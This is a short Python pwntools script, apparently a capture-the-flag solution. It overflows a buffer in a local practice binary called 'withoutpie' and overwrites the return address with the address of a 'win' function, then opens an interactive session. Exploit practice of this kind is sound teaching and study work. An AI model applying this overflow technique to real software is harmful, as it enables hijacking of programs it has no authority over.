from pwn import *
binary= context.binary = ELF("./withoutpie")
p = process(binary.path)
p.sendline((0x71+0x4)*b'A' + p32(binary.sym.win))
p.interactive()
#FINISHED
